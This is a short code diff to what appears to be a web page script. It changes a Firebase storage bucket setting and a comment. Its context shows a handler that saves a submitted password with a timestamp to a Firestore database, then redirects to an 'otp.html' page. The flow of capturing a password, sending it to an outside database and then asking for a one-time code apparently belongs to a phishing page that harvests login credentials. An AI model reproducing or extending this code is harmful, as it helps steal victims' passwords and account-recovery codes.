@@ -88,7 +88,7 @@
       apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
       authDomain: "dlhiljbrd.firebaseapp.com",
       projectId: "dlhiljbrd",
-      storageBucket: "dlhiljbrd.firebasestorage.app",
+      storageBucket: "dlhiljbrd.appspot.com",
       messagingSenderId: "981951131769",
       appId: "1:981951131769:web:5d56cd1423d753992664a8"
     };
@@ -110,7 +110,7 @@
         password: pass,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
-        window.location.href = "otp.html"; // Change this to your actual next page file
+        window.location.href = "otp.html"; // Change this to your next page
       }).catch((error) => {
         alert("Error saving to Firebase: " + error);
       });
